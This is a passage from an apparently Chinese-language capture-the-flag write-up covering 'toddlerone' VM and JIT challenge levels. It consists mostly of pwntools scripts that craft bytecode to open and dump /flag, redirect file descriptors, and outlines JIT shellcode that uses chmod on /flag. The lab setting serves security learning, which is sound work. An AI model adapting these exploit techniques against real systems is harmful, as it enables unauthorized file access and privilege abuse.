string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x02'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x02</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x6c'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x03'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x61'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x04'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x67'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x00</span>    <span class="token string">b'\&#123;sys&#125;\&#123;open&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x10'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x10</span>    <span class="token string">b'\&#123;imm&#125;\&#123;c&#125;\x40'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x40</span>    <span class="token string">b'\&#123;sys&#125;\&#123;read&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b, c) ---> return a</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>    <span class="token string">b'\&#123;sys&#125;\&#123;write&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># write(a, b, c) ---> return a</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;sys&#125;\x08\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># exit(a)</span><span class="token punctuation">]</span>payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这个题很巧妙，没有内存溢出的漏洞。只是要利用syscalls实现的漏洞，来达到虽然只是一次syscall但是却是可以执行多个系统调用的效果。这里面不太明白的问题是，为什么将代码写到文件中，然后送入目标程序，同时进行重定向就可以。但是通过pwntool工具启动的话，就无法成功。</p><p>关键点，由于read函数返回的是读取的字节大小，下一步write写入的又要是标准输入，所以你要把flag文件大小 <code>ls -l /flag</code>对应的文件描述符重定向到标准输出。</p><p>但是我用这个命令启动toddlerone_level10.0的话，flag又直接打印在控制台了，可是我之前是将标准输出定向到test文件中了啊。不明白这里为什么会出现这种问题。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/challenge/toddlerone_level10.0 <span class="token operator">&lt;</span> ./bin <span class="token number">5</span><span class="token operator"><span class="token file-descriptor important">7</span>&lt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">></span> ./test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""/flag  ---> 2f 66 6c 61 67arg1      arg2          op value     register          syscall a   0x10b   0x01c   0x20d   0x8s   0x02i   0x40f   0x04read    0x8write   0x10open    0x4exit    0x2sys 0x8imm 0x4jmp 0x80"""</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> jmp<span class="token punctuation">)</span><span class="token punctuation">:</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>jmp<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_listelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.0"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x03\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>    <span class="token string">b'\x2f\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x04\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>    <span class="token string">b'\x66\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x05\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x05</span>    <span class="token string">b'\x6c\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x06\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x06</span>    <span class="token string">b'\x61\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x07\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x07</span>    <span class="token string">b'\x67\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>    <span class="token string">b'\&#123;b&#125;\&#123;a&#125;\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x03\&#123;a&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>    <span class="token string">b'\x10\&#123;b&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x10</span>    <span class="token string">b'\x50\&#123;c&#125;\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x50</span>    <span class="token string">b'\&#123;a&#125;\&#123;open&#125;\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a </span>    <span class="token comment"># b'\x10\&#123;b&#125;\&#123;imm&#125;', # imm b, 0x10</span>    <span class="token comment"># b'\x40\&#123;c&#125;\&#123;imm&#125;', # imm c, 0x40</span>    <span class="token comment"># b'\&#123;a&#125;\&#123;read&#125;\&#123;sys&#125;', # read(a, b, c) ---> return a</span>    <span class="token comment"># b'\x01\&#123;a&#125;\&#123;imm&#125;', # imm a, 0x01</span>    <span class="token comment"># b'\&#123;a&#125;\&#123;write&#125;\&#123;sys&#125;', # write(a, b, c) ---> return a</span>    <span class="token comment"># b'\x00\&#123;a&#125;\&#123;imm&#125;', # imm a, 0x00</span>    <span class="token comment"># b'\&#123;a&#125;\x02\&#123;sys&#125;', # exit(a)</span><span class="token punctuation">]</span>payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x01</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x1C</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x04</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x08</span><span class="token punctuation">,</span> jmp<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level10/bin"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">redirect_fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># os.dup2(1, 3)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>    <span class="token comment"># os.dup2(3, 0x39)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span>  <span class="token comment"># 将文件描述符 3 重定向到标准输出 (fd 1)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.0"</span><span class="token punctuation">,</span> preexec_fn<span class="token operator">=</span>redirect_fd<span class="token punctuation">)</span><span class="token comment"># 明确重定向文件描述符</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h3><p><code>/challenge/toddlerone_level10.1 &lt; ./bin_2 57&lt;&amp;1</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""/flag  ---> 2f 66 6c 61 67imm 0x10stm 0x1sys 0x8op      arg1        arg2        register    value        syscall   a   0x20b   0x4c   0x10d   0x40s   0x8i   0x1f   0x2read    0x20write   0x10open    0x1exit    0x4"""</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">)</span><span class="token punctuation">:</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_listelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.1"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x2f'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x66'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x02'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x02</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x6c'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x03'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x61'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x04'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x67'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x00</span>    <span class="token string">b'\&#123;imm&#125;\&#123;c&#125;\x50'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x50</span>    <span class="token string">b'\&#123;sys&#125;\&#123;open&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a</span><span class="token punctuation">]</span>payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x31</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level10/bin_2"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">redirect_fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># os.dup2(1, 3)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>    <span class="token comment"># os.dup2(3, 0x39)  # 将文件描述符 3 重定向到标准输出 (fd 1)</span>    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span>  <span class="token comment"># 将文件描述符 3 重定向到标准输出 (fd 1)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level10.1"</span><span class="token punctuation">,</span> preexec_fn<span class="token operator">=</span>redirect_fd<span class="token punctuation">)</span><span class="token comment"># 明确重定向文件描述符</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关是Just In time（JIT），会将你的输入的二进制指令翻译为机器码执行，跟高级脚本语言的设计是一样的。规定了代码段、数据段。</p><p>但是可以通过短跳转的方式，跳转到原始指令的中间部分，这样可以通过可以操作的立即数部分，来自定义shellcode部分。</p><p>跳转到指令中间部分以后，还可以继续利用 <code>jmp</code>指令，进行短跳转到下一个原始指令的中间部分。这样就可以实现连续的控制流。</p><p>在shellcode的编写方面，还是借鉴了之前 <code>shellcode</code>关卡的部分，还是利用创建符号连接，然后使用 <code>chmod</code>系统调用修改 <code>/flag</code>文件权限获取 <code>flag</code>文件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""/flag  ---> 2f 66 6c 61 67imm 0x8stm 0x20sys 0x4op      arg1        arg2        register    value        syscall   a   0x20b   0x1c   0x2d   0x10s   0x40i   0x4f   0x8read    0x20write   0x10open    0x1exit    0x4"""</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> jmp<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    b <span class="token operator">=</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    c <span class="token operator">=</span> p64<span class="token 